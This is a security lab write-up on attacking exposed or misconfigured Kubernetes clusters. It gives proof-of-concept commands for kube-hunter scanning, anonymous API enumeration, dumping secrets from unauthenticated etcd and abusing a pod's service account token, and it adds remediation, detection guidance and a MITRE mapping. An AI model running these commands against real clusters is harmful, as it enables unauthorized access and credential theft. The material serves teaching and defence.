> **English** | [Italiano](README.md)

# Kubernetes attacks - exposed and misconfigured clusters

> - **Phase:** Cloud Security - Kubernetes Attack (Orchestration)
> - **Visibility:** Medium - the API server calls are in the cluster's audit log (if enabled); kube-hunter generates detectable scanning traffic
> - **Prerequisites:** A reachable K8s cluster (exposed API server, kubelet, etcd) or initial access (compromised pod, service account token); kubectl, kube-hunter
> - **Output:** Finding CLOUD-007; access to the cluster; secret theft; workload execution; potential control of the cluster

- **Operating Environment:** Author's lab Kubernetes cluster, kubectl
- **Main tools:** kubectl, kube-hunter, etcdctl

---

## Executive summary

Kubernetes (K8s) is the operating system of the modern cloud: it orchestrates thousands of containers on clusters of nodes, managing deployments, networking, storage and secrets. This centrality makes it a very high-value target: compromising the cluster means controlling all the workloads running on it. It is also a vast and complex attack surface, with many exposed components and many configurations to get wrong.

The main vectors concern the control plane components. The **API server** (`kube-apiserver`) is the brain of the cluster; if exposed and with anonymous access enabled, it allows querying and manipulating the cluster without credentials. The **etcd** is the database that contains all the cluster's state, including the secrets in cleartext; an unauthenticated and exposed etcd is the total compromise of the cluster. The **kubelet** on each node, if exposed, allows executing commands in the pods. Finding CLOUD-007 documents the exploitation of these exposures.

A second vector starts from the inside: a compromised pod (via an app RCE) contains by default a mounted service account token, which can give access to the cluster's API. From there, with misconfigured RBAC, one arrives at escalation. **kube-hunter** is the reconnaissance tool that discovers these weaknesses from outside or inside the cluster.

---

## Folder structure

```
K8s-attacks/
+-- README.md      # this file: attacks on exposed/misconfigured clusters (CLOUD-007)
+-- img/           # kube-hunter and etcd/API access
```

---

## Exploitation of an exposed cluster

**Finding ID:** `CLOUD-007` | **Severity:** `Critical` (unauthorized access to the control plane; exposed etcd/API = secret theft and control of the cluster)

### Operational context

A K8s cluster exposes several network services. If unprotected (authentication, authorization, network policy), they become access paths: the API server with anonymous access, the etcd without authentication, the open kubelet. kube-hunter automates the discovery of these exposures; kubectl and etcdctl exploit them.

### PoC - phase 1: reconnaissance with kube-hunter

```Bash
# kube-hunter looks for exposed K8s components and known vulnerabilities
kube-hunter --remote <cluster-ip>
```

```
[+] Kubernetes API Server         open at <ip>:6443
[!] Anonymous access to API       -> ENABLED               <-- anonymous access (CLOUD-007)
[!] Etcd is accessible            at <ip>:2379 (no auth)   <-- exposed etcd (CLOUD-007)
[+] Kubelet API                   open at <node>:10250
```

### PoC - phase 2: anonymous access to the API server

```Bash
# If anonymous access is enabled: cluster enumeration without credentials
kubectl --server=https://<ip>:6443 --insecure-skip-tls-verify get pods -A
```

```
NAMESPACE    NAME                 STATUS
kube-system  etcd-master          Running
production   web-app-7d9f...      Running                  <-- workloads enumerated (CLOUD-007)
```

### PoC - phase 3: secret theft from exposed etcd

```Bash
# etcd contains all the cluster state, including the Secrets in cleartext
etcdctl --endpoints=http://<ip>:2379 get / --prefix --keys-only | grep secret
etcdctl --endpoints=http://<ip>:2379 get /registry/secrets/production/db-credentials
```

```
# Kubernetes Secrets are only base64, not encrypted by default in etcd
data: { "password": "UGFzc3cwcmQh" }   <-- DB credentials in cleartext (CLOUD-007)
# exposed etcd = all the cluster's secrets compromised
```

### PoC - phase 4: escalation from a compromised pod

```Bash
# From a compromised pod: the service account token is mounted by default
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# If the SA has excessive permissions (misconfigured RBAC) -> control of the cluster
kubectl --token=<token> auth can-i --list
```

```
Resources    Verbs
pods         create,delete    <-- can create pods
secrets      get,list         <-- can read all the secrets (CLOUD-007)
# an over-privileged SA in a breached pod = escalation to the cluster
```

### Remediation

- **No anonymous access:** disable the anonymous auth on the API server; authentication and authorization (RBAC) mandatory
- **Protect etcd:** mutual TLS authentication on etcd, never exposed to the network; enable Secret encryption at rest, otherwise they are only base64
- **Least-privilege RBAC:** the service accounts must have minimal permissions; do not mount the token where not needed (`automountServiceAccountToken: false`)
- **Network policy and hardening:** limit the network access to the control plane components; authenticated kubelet; audit log enabled; auditing with kube-bench (`../K8s-auditing/`)

---

## Lab experience

The etcd exposure was the most impressive discovery for its totality. Kubernetes Secrets are often perceived as "secure" because they are managed by the cluster, but in etcd - without encryption at rest, which is not active by default - they are only base64, that is, in cleartext. An etcd reachable without authentication delivers every secret of the cluster in one command. This made concrete that "Secret" in Kubernetes does not mean "encrypted": it means "object of type Secret", a distinction that changes everything on the defensive plane.

kube-hunter made the reconnaissance almost trivial, highlighting the vastness of the K8s surface. A cluster is not a service but a set of components (API server, etcd, kubelet, scheduler, controller) each with its port and its security configuration. Each is a potential entry point, and the security of the cluster is that of the worst-configured component. The complexity of Kubernetes is, as with IAM, itself a source of risk.

The service account token vector linked the attack to the rest of the path. A pod running a breached web app (module 03) mounts by default a token that, if the service account is over-privileged, gives access to the cluster's API. An RCE on a container does not stay confined: via the token and permissive RBAC, it becomes a path toward the control plane. This showed that the security of the workloads and the security of the cluster are inseparable.

---

## Theoretical analysis: complexity as an attack surface

Kubernetes exemplifies a recurring principle in the cloud: complexity is itself a vulnerability. A cluster has dozens of components, hundreds of configuration objects, an authorization system (RBAC) that is granular but intricate, and multiple network layers. Each element is configurable securely, but the space of configurations is so vast that error becomes probable. Security does not depend on a single control but on the simultaneous correctness of many, and one exposed component is enough to compromise the whole.

The etcd case illustrates a second principle: defaults are not always secure. Secret encryption at rest is not active by default in Kubernetes; whoever does not enable it explicitly has the secrets in cleartext in etcd. This contradicts the intuitive assumption that an object called "Secret" is protected. The lesson is that in the cloud one cannot deduce security from the name or the expectation: it must be verified in the actual configuration. "Secret" is a promise that must be kept with encryption, not an implicit guarantee.

The service account vector, finally, shows the transmission of trust in complex systems. A pod inherits an identity (the service account) with its permissions; if that identity is over-privileged, every pod that uses it is a potential escalation point. It is the same principle as Azure's managed identities and GCP's service accounts: the non-human identities tied to the workloads are convenient but transfer the trust to the workload, and a compromised workload inherits the identity. Least privilege applied to the service accounts is, here too, the fundamental defense - because in a system where everything is connected, every excessive privilege is a propagation path.

---

## Real-World scenario: Post-Exploitation projection

> Attacker and defender perspectives in a real engagement.

### Attacker perspective (red team)

**Starting point:** access to the control plane of a K8s cluster (via anonymous API, exposed etcd or over-privileged token) (CLOUD-007).

**Projected kill chain:**

```
[CLOUD-007] Exposed/misconfigured cluster -> access to the control plane
        |
        v
Secret theft (etcd/API) -> DB, cloud, registry credentials
        |
        v
Deploy of malicious pods -> code execution on all the nodes
        |
        v
Escape from the pod to the host (CLOUD-006) -> control of the nodes
        |
        v
Control of the cluster + cloud pivot (the Secrets contain cloud credentials)
```

**Potential impact:** control of a K8s cluster is equivalent to control of all the workloads it orchestrates - their apps, their data, their secrets. The stolen Secrets frequently contain credentials toward other systems (databases, cloud providers, registries), making the cluster a springboard toward the entire infrastructure. The ability to deploy arbitrary pods gives code execution on every node, and the abuse of the resources (cryptomining on clusters) is a common monetization vector.

### Defender perspective (blue team)

**Detection:** the API server's audit log (if enabled) records the anomalous calls; Falco detects suspicious behaviors in the pods; kube-hunter traffic and calls to etcd/kubelet from unexpected sources are indicators.

**Indicators of Compromise (IOC):**
- API server calls from anonymous or unexpected identities
- Access to etcd from outside the control plane
- Creation of privileged pods or in system namespaces
- Massive Secret enumeration; use of service account tokens from anomalous contexts

**Containment and hardening:**
- Disable anonymous access; least-privilege RBAC; `automountServiceAccountToken: false` where not needed
- etcd with mutual TLS and never exposed; Secret encryption at rest
- Network policy on the control plane; audit log enabled; Pod Security Standards
- Continuous auditing with kube-bench (`../K8s-auditing/`) and runtime detection with Falco

**Defensive lesson:** in Kubernetes, security is the sum of many correct configurations, and the complexity makes systematic auditing indispensable. No human can verify the posture of a real cluster by hand; tools like kube-bench (CIS) and kube-hunter (from the offensive side) are necessary to find the exposures before the attacker. The defense of the cluster is, first of all, the discipline of the verified configuration.

---

## Reference tools

| tool | type | role | main use case |
| :--- | :--- | :--- | :--- |
| `kubectl` | k8s cli | official | interaction with the cluster's api |
| `kube-hunter` | recon/scanner | offensive | discovery of exposed components and vulnerabilities |
| `etcdctl` | etcd cli | offensive/admin | direct access to etcd (secret theft if exposed) |
| `kube-bench` | cis auditing | defensive | cis verification of the cluster (`../K8s-auditing/`) |
| `Falco` | runtime security | defensive | runtime detection of anomalous behaviors |
| `Peirates` | exploitation | offensive | post-exploitation framework for k8s |

> **Recommended modern tool:** `kube-hunter` for the offensive reconnaissance, `Peirates` for the post-exploitation. Defensively, `kube-bench` for the CIS audit and `Falco` for the runtime detection. The offensive/defensive symmetry is strong: kube-hunter finds what kube-bench helps to correct.

---

## MITRE ATT&CK mapping

> Reference: MITRE ATT&CK for Containers.

| tactic | technique | mitre id | action description |
| :--- | :--- | :--- | :--- |
| initial access | exploit public-facing application | `T1190` | access to the cluster via exposed api/etcd/kubelet (CLOUD-007) |
| credential access | unsecured credentials: container api | `T1552.007` | theft of the tokens/secrets from the api or etcd (CLOUD-007) |
| discovery | container and resource discovery | `T1613` | enumeration of pods, namespaces, secrets of the cluster |
| execution | deploy container | `T1610` | deploy of malicious pods to execute code on the nodes |
| privilege escalation | valid accounts / rbac abuse | `T1078` | escalation via over-privileged service account |

---

> **Note:** All documented activities were conducted on a Kubernetes lab cluster owned by the author. Unauthorized access to third-party clusters is a crime (unauthorized access). Kubernetes security testing requires explicit authorization. Techniques are documented for educational and authorized security assessment purposes.
